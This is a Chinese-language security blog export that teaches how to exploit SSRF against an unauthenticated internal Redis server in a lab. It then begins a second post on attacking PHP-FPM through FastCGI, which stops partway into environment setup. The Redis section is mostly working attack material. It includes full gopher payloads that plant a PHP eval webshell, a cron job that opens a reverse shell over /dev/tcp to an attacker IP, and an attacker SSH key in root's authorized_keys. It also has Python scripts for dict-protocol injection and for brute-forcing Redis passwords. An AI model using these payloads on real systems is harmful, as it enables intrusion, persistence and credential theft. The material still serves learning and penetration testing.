<h2 id="SSRF结合Redis未授权访问GetShell"><a href="#SSRF结合Redis未授权访问GetShell" class="headerlink" title="SSRF结合Redis未授权访问GetShell"></a>SSRF结合Redis未授权访问GetShell</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Redis因配置不当可以未授权访问（窃取数据、反弹shell、数据备份操作主从复制、命令执行）。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。</p>
<p>在这里主要讲解SSRF的利用，所以就不对Redis的协议进行分析了，直接使用Exp进行利用。</p>
<p>之后会对Redis的漏洞进行深入学习。</p>
<blockquote>
<p><strong>常见redis反弹shell的bash脚本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h $1 -p $2 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.86.131/8080 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure>
<ul>
<li>flushall：删除所有数据库中的所有key。这行代码感觉不是很有必要。。。</li>
<li>-x参数：从标准输入读取一个参数：<ul>
<li>在redis的第0个数据库中添加key为1，value为<code>\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n</code>的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。</li>
<li>dir 数据库备份的文件放置路径</li>
<li>Dbfilename 备份文件的文件名</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>推荐使用<strong>Gopherus</strong>可以帮助我们直接生成gopher payload，以利用SSRF GetShell。</p>
<p>项目地址：<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
<h4 id="写入WebShell"><a href="#写入WebShell" class="headerlink" title="写入WebShell"></a>写入WebShell</h4><p>利用条件：</p>
<ol>
<li>redis 需要对网站中的目录有写权限</li>
<li>知道网站绝对路径</li>
</ol>
<p>使用Gopherus生成payload：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/29/cXLgiB3TDdYwq54.png" alt="image-20211129145802825"></p>
<p>再对生成的payload进行URL编码，就是我们最终生成的payload</p>
<p><img src="https://i.loli.net/2021/11/29/PmruVxkUjgGdcAX.png" alt="image-20211129145938675"></p>
<p>放入URL参数浏览器请求如下，成功执行Redis命令写入webshell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackroom.com/mylabs/ssrf/curl_exec.php?url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252436%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527hackme%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>
<p>成功写入WebShell</p>
<p><img src="https://i.loli.net/2021/11/29/xSj9CI4knUyvPXf.png" alt="image-20211129152046102"></p>
<p><img src="https://i.loli.net/2021/11/29/RFVLTriyEzUkPCA.png" alt="image-20211129153455684"></p>
<h4 id="crontab-定时任务反弹-shell"><a href="#crontab-定时任务反弹-shell" class="headerlink" title="crontab 定时任务反弹 shell"></a>crontab 定时任务反弹 shell</h4><p>利用条件：</p>
<ul>
<li>Redis需要使用root用户启用（不是通过service或systemctl启动）</li>
<li>这个方法只能Centos上使用，Ubuntu上行不通，原因如下：</li>
</ul>
<ol>
<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
</ol>
<blockquote>
<p>由于系统的不同，crontrab定时文件位置也会不同</p>
<p>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></p>
<p>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code></p>
<p>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
</blockquote>
<h5 id="使用gopher协议写入"><a href="#使用gopher协议写入" class="headerlink" title="使用gopher协议写入"></a>使用gopher协议写入</h5><p>使用Gopherus生成payload：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/29/5B3SF8nLuOP9QZJ.png" alt="image-20211129173511057"></p>
<p>再对生成的payload进行URL编码，就是我们最终生成的payload</p>
<p><img src="https://i.loli.net/2021/11/29/hOXlemIzF7jGs3H.png" alt="image-20211129172300220"></p>
<p>放入URL参数浏览器请求如下，成功执行Redis命令，写入计划任务，执行反弹shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackroom.com/mylabs/ssrf/curl_exec.php?url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252469%250D%250A%250A%250A%252A/1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-c%2520%2522sh%2520-i%2520%253E%2526%2520/dev/tcp/192.168.123.66/1234%25200%253E%25261%2522%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252416%250D%250A/var/spool/cron/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>
<p>成功在计划任务中写入反弹shell命令（每分钟执行一次）</p>
<p><img src="https://i.loli.net/2021/11/29/fMluStdgByQWcUC.png" alt="image-20211129172545796"></p>
<p>在攻击机上使用nc启用监听<code>nc -lvp 1234</code>，等待一会成功反弹shell</p>
<p><img src="https://i.loli.net/2021/11/29/zSky6joMtV84HRF.png" alt="image-20211129173636224" style="zoom: 80%;"></p>
<h5 id="使用dict协议写入"><a href="#使用dict协议写入" class="headerlink" title="使用dict协议写入"></a>使用dict协议写入</h5><p>dict 协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，能用来探测端口的指纹信息。</p>
<p>协议格式：<code>dict://&lt;host&gt;:&lt;port&gt;/&lt;dict-path&gt;</code></p>
<p>一般为：<code>dict://&lt;host&gt;:&lt;port&gt;/info</code> 探测端口应用信息</p>
<p>执行命令：<code>dict://&lt;host&gt;:&lt;port&gt;/命令:参数</code> 冒号相当于空格，在 redis 利用中，只能利用未授权访问的 redis</p>
<p>与 gopher 不同的是，使用 dict 协议并不会吞噬第一个字符，并且会多加一个 quit 字符串，自动添加 CRLF 换行。</p>
<p><img src="https://i.loli.net/2021/11/29/uALxZnmMozjBylg.png" alt="image-20211129174920740"></p>
<p>其他的与 gopher 没有太大差别。</p>
<p>在 redis 未授权访问中，当传输命令时，dict 协议的话要一条一条的执行，而 gopher 协议执行一条命令就行了，所以一般 dict 协议只是当个备胎用。</p>
<p>而且在传输命令时，若命令中有空格，则该命令需要做一次<strong>十六进制编码</strong>。</p>
<p>在这里使用了一个大佬写好的python脚本进行利用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2,urllib,binascii</span><br><span class="line">url = <span class="string">&quot;http://hackroom.com/mylabs/ssrf/curl_exec.php?url=&quot;</span>  <span class="comment"># 存在 ssrf 的 url</span></span><br><span class="line">target = <span class="string">&quot;dict://127.0.0.1:6379/&quot;</span>  <span class="comment"># redis 内网服务器地址</span></span><br><span class="line">cmds = [<span class="string">&#x27;set:mars:\\\\&quot;\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.123.66/9999 0&gt;&amp;1\\n\\\\&quot;&#x27;</span>,  <span class="comment"># shell接收地址与端口号</span></span><br><span class="line">       <span class="string">&quot;config:set:dir:/etc&quot;</span>,</span><br><span class="line">       <span class="string">&quot;config:set:dbfilename:crontab&quot;</span>,</span><br><span class="line">       <span class="string">&quot;bgsave&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> cmds:</span><br><span class="line">    cmd_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> single_char <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="comment"># 先转为ASCII</span></span><br><span class="line">        cmd_encoder += <span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    cmd_encoder = binascii.a2b_hex(cmd_encoder)</span><br><span class="line">    cmd_encoder = urllib.quote(cmd_encoder,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = url + target + cmd_encoder</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    request = urllib2.Request(payload)</span><br><span class="line">    response = urllib2.urlopen(request).read()</span><br></pre></td></tr></table></figure>
<p>从脚本的执行结果可以看出，dict 协议需要一条一条执行</p>
<p><img src="https://i.loli.net/2021/11/29/o8Y3ZxKzSUMtF5C.png" alt="image-20211129180614201"></p>
<p>写入成功</p>
<p><img src="https://i.loli.net/2021/11/29/x7XwTl6SUyjcMAq.png" alt="image-20211129191425737"></p>
<h4 id="写入SSH公钥"><a href="#写入SSH公钥" class="headerlink" title="写入SSH公钥"></a>写入SSH公钥</h4><p>利用条件：</p>
<ul>
<li>Redis需要使用root用户启用</li>
</ul>
<p>通过在目标机器上写入 ssh 公钥，然后便可以通过 ssh 免密码登录目标机器。</p>
<p><strong>生成ssh 公/私钥</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>一直回车即可</p>
<p><img src="https://i.loli.net/2021/11/29/RbsPng1ofthkU4m.png" alt="image-20211129190425762"></p>
<p>可以在家目录的<code>.ssh/</code>下看到生成的结果，分别为私钥和公钥</p>
<p><img src="https://i.loli.net/2021/11/29/r2hSfYXzO4cayVp.png" alt="image-20211129190733667"></p>
<p><strong>未授权访问直接写</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copyflushall</span><br><span class="line">set 1 &#x27;id_rsa.pub 里的内容&#x27;</span><br><span class="line">config set dir &#x27;/root/.ssh/&#x27;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>然后通过<code>ssh -i /root/.ssh/id_rsa root@192.168.123.66</code> 即可免密登录远程机器</p>
<p><strong>结合 SSRF</strong></p>
<p>编写脚本将内容转换为 RESP 协议的格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.123.66&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">sshpublic_key = <span class="string">&quot;\n\nid_rsa.pub 里的内容\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(sshpublic_key.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span> urllib.quote(payload)</span><br></pre></td></tr></table></figure>
<p>执行脚本，放入URL参数浏览器请求如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackroom.com/mylabs/ssrf/curl_exec.php?url=gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524569%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQCz64S4uDZGCLcmvzAPllttoM8F2ou3gtVJKO41/zA1/v6iDds%252BuNUgaUKC7Ntx%252BHqDTB98Hbl8CmvVkWqvNd3D3lo1KF2qikNuel/Fx4inoi8T8ECGcXqUVkq8mB0sG0opbYTwNnFrwd4sY0eXD%252BhRmwfAfVPLbOGC8hwKPSckUghWm2DAQPSqQPC290CTDcz%252BBxDNAVhbxPH/de0depH6fCoCQOA3CtnabfFU8jVosfR4T2D80BlMtIzo/OsZxzUtUikcN7e1a/vjXy5YrMRAlZ6JxAHrkenhhPEqubpUdIr0vONHsjbfGBnh0T3SS/Tr/EWlTWuSSjF/L%252BMseqIj8ojN0/8EACmyqHWady0ZZNSXW2hNcAey7plp8ETMaXdPiXG1SuVriq/XmN/b80sovkTprHIzJzmaqa2NWNHwXgrtmVHhs7DkN8R6FjsiydzSRBLf9oDg4K6/1tS7TneYHGyp3aNCtmGnXi8TjILbUloPhRzxfHWVwhKfF%252BBTlC0%253D%2520root%2540Ulysses%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A/root/.ssh/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>
<p>可以看到在受害者的机器上成功写入攻击者的公钥</p>
<p><img src="https://i.loli.net/2021/11/29/rofH1DS7CvLawqO.png" alt="image-20211129193827668"></p>
<p>这样一来就可以使用ssh无密码远程登录了</p>
<p><img src="https://i.loli.net/2021/11/29/xjn7yEgTFUHsDzc.png" alt="image-20211129194046297"></p>
<h2 id="SSRF暴力破解内网Redis弱口令"><a href="#SSRF暴力破解内网Redis弱口令" class="headerlink" title="SSRF暴力破解内网Redis弱口令"></a>SSRF暴力破解内网Redis弱口令</h2><p>在内网redis需要密码的情况下，使用dict协议或者gopher协议登录。</p>
<h3 id="使用dict协议暴力破解"><a href="#使用dict协议暴力破解" class="headerlink" title="使用dict协议暴力破解"></a>使用dict协议暴力破解</h3><p>在登录错误的情况下返回如下信息</p>
<p><img src="https://i.loli.net/2021/11/29/1VDSi2IG7nwjmLZ.png" alt="image-20211129200305828"></p>
<p>在登录正确的情况下返回如下信息</p>
<p><img src="https://i.loli.net/2021/11/29/sktKQg5m1NzuX4r.png" alt="image-20211129200340232"></p>
<p>自动化脚本编写（python3）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://hackroom.com/mylabs/ssrf/curl_exec.php?url=&quot;</span>  <span class="comment"># 请输入目标url</span></span><br><span class="line"></span><br><span class="line">param = <span class="string">&#x27;dict://192.168.123.188:6379/auth:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwords.txt&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    passwds = file.readlines()</span><br><span class="line">    <span class="keyword">for</span> passwd <span class="keyword">in</span> passwds:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在尝试密码：&quot;</span> + passwd)</span><br><span class="line">        passwd = passwd.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        all_url = url + param + passwd</span><br><span class="line">        request = urllib.request.Request(all_url)</span><br><span class="line">        response = urllib.request.urlopen(request).read()</span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;+OK\r\n+OK\r\n&quot;</span>.encode() <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 爆破成功 密码为: &quot;</span> + passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="使用gopher协议暴力破解"><a href="#使用gopher协议暴力破解" class="headerlink" title="使用gopher协议暴力破解"></a>使用gopher协议暴力破解</h3><p>在登录错误的情况下返回如下信息</p>
<p><img src="https://i.loli.net/2021/11/29/AxKjGVlbiYMNTqS.png" alt="image-20211129201936583"></p>
<p>在登录正确的情况下返回如下信息</p>
<p><img src="https://i.loli.net/2021/11/29/EnhSoUjYlCIJ1e3.png" alt="image-20211129202016066"></p>
<p>自动化脚本编写（python3）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://hackroom.com/mylabs/ssrf/curl_exec.php?url=&quot;</span>  <span class="comment"># 请输入目标url</span></span><br><span class="line">rhost = <span class="string">&quot;192.168.123.188&quot;</span></span><br><span class="line">rport = <span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;passwords.txt&quot;</span>,<span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    passwds = file.readlines()</span><br><span class="line">    <span class="keyword">for</span> passwd <span class="keyword">in</span> passwds:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在尝试密码：&quot;</span> + passwd)</span><br><span class="line">        passwd = passwd.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        len_pass = <span class="built_in">len</span>(passwd)</span><br><span class="line">        payload = <span class="string">r&quot;gopher://&quot;</span> + rhost + <span class="string">&quot;:&quot;</span> + rport + <span class="string">&quot;/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524&quot;</span>+<span class="built_in">str</span>(len_pass)+<span class="string">r&quot;%250d%250a&quot;</span>+passwd+<span class="string">r&quot;%250D%250A%252A1%250D%250A&quot;</span></span><br><span class="line">        url = target+<span class="built_in">str</span>(payload)</span><br><span class="line">        text = requests.get(url).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;OK&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 爆破成功 密码为: &quot;</span> + passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：若redis在受害者本地的服务器，可以直接使用file协议读取配置文件中的密码</p>
<p>常见的Redis配置文件路径如下：</p>
<ul>
<li>/etc/redis.conf</li>
<li>/etc/redis/redis.conf</li>
<li>/usr/local/redis/etc/redis.conf</li>
<li>/opt/redis/ect/redis.conf</li>
</ul>
</blockquote>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><p><a href="https://www.cnblogs.com/flokz/p/weblogic_SSRF.html">SSRF——weblogic vulhub 漏洞复现及攻击内网redis（一）（附批量检测脚本） - Flo_Kz - 博客园 (cnblogs.com)</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">10.Redis未授权访问漏洞复现与利用 - bmjoker - 博客园 (cnblogs.com)</a></p>
</li>
<li><p><a href="https://cloud.tencent.com/developer/article/1764331">Redis未授权访问漏洞利用总结 - 云+社区 - 腾讯云 (tencent.com)</a></p>
</li>
<li><p><a href="https://www.freebuf.com/articles/web/303275.html">SSRF漏洞之Redis利用篇【三】 - FreeBuf网络安全行业门户</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用 - 先知社区 (aliyun.com)</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/wjrblogs/p/14456190.html">SSRF + Redis 利用方式学习笔记 - 1ndex- - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.x1uq1n9.cn/blog/?p=326">Gopher SSRF攻击内网应用复现 - X1u_q1n9’s Blog (x1uq1n9.cn)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SSRF服务端请求伪造</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>利用SSRF渗透内网主机·中</title>
    <url>/post/ecd40306.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SSRF攻击FastCGI执行命令"><a href="#SSRF攻击FastCGI执行命令" class="headerlink" title="SSRF攻击FastCGI执行命令"></a>SSRF攻击FastCGI执行命令</h2><h3 id="FastCGI与PHP-FPM"><a href="#FastCGI与PHP-FPM" class="headerlink" title="FastCGI与PHP-FPM"></a>FastCGI与PHP-FPM</h3><h4 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h4><p><strong>快速通用网关接口</strong>（<strong>Fast</strong> <strong>C</strong>ommon <strong>G</strong>ateway <strong>I</strong>nterface／<strong>FastCGI</strong>）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使[服务器可以同时处理更多的网页请求。</p>
<p>众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要通过浏览器进行解析，其中的页面是一对一的(一个内容对应一个页面)，而动态网站需要一个额外的编译解析的过程，网页上的数据是从数据库中或者其他地方调用，页面会随着数据的变化而改变，就产生了一定的交互性。</p>
<p><strong>浏览器访问静态网页过程</strong></p>
<p>在整个网页的访问过程中，Web容器(例如Apache、Nginx)只担任着内容分发者的身份，当访问静态网站的主页时，Web容器会到网站的相应目录中查找主页文件，然后发送给用户的浏览器。</p>
<p><img src="https://i.loli.net/2021/12/01/jg4Ur7So8LD2QBf.jpg" alt="img"></p>
<p><strong>浏览器访问动态网页过程</strong></p>
<p>当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，web容器就会去找PHP解析器来进行处理(这里以Apache为例)，它会把这个请求进行简单的处理，然后交给PHP解释器。</p>
<p><img src="https://i.loli.net/2021/12/01/onQ2BR4gIOLZixu.jpg" alt="img"></p>
<p>当Apache收到用户对 index.php 的请求后，如果使用的是CGI，会启动对应的 CGI 程序，对应在这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p>
<p>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它像一个常驻的CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能 。</p>
<h4 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h4><p>了解了CGI和FastCGI之后，我们来看一下什么是php-fpm，官方对它的解释是<strong>FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。</strong></p>
<p>也就是说php-fpm是FastCGI的一个具体实现，并且提供了进程管理的功能，在其中的进程中，包含了master和worker进程，这个在后面我们进行环境搭建的时候可以通过命令查看。其中master 进程负责与 Web 服务器进行通信，接收 HTTP 请求，再将请求转发给 worker 进程进行处理，<strong>worker 进程主要负责动态执行 PHP 代码，</strong>处理完成后，将处理结果返回给 Web 服务器，再由 Web 服务器将结果发送给客户端。</p>
<h3 id="PHP-FPM攻击实现原理"><a href="#PHP-FPM攻击实现原理" class="headerlink" title="PHP-FPM攻击实现原理"></a>PHP-FPM攻击实现原理</h3><p>想要分析它的攻击原理需要从FastCGI协议封装数据内容来看，这里仅对攻击原理做简要描述，<a href="https://www.cnblogs.com/itbsl/p/9828776.html">CGI 和 FastCGI 协议的运行原理</a>这篇文章中详细介绍了FastCGI协议的内容，其攻击原理就是在设置环境变量实际请求中会出现一个<code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code>这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。</p>
<p>而在php5.3.9后来的版本中，php增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在php官方允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改php的设置。</p>
<p>那么当设置php环境变量为:<code>auto_prepend_file = php://input;allow_url_include = On</code>,就会在执行php脚本之前包含<code>auto_prepend_file</code>文件的内容,<code>php://input</code>也就是POST的内容,这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="安装环境与依赖"><a href="#安装环境与依赖" class="headerlink" title="安装环境与依赖"></a>安装环境与依赖</h4><p>这里直接在Ubuntu上安装Nginx和php-fpm，首先安装Nginx</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure>
<p>安装php、php-fpm以及一些插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install software-properties-common python-software-properties </span><br><span class="line">sudo add-apt-repository ppa:ondrej/php          <span class="comment">#这里容易卡死,解决方法使用代理</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install php7.2</span><br><span class="line">sudo apt-get -y install php7.2-fpm php7.2-mysql php7.2-curl php7.2-json php7.2-mbstring php7.2-xml  php7.2-intl </span><br></pre></td></tr></table></figure>
<h4 id="配置php-fpm"><a href="#配置php-fpm" class="headerlink" title="配置php-fpm"></a>配置php-fpm</h4><p>修改配置监听9000端口来处理nginx的请求</p>
<p>打开<code>/etc/php/7.2/fpm/pool.d/www.conf</code>文件找到如下位置注释第一行添加第二行</p>
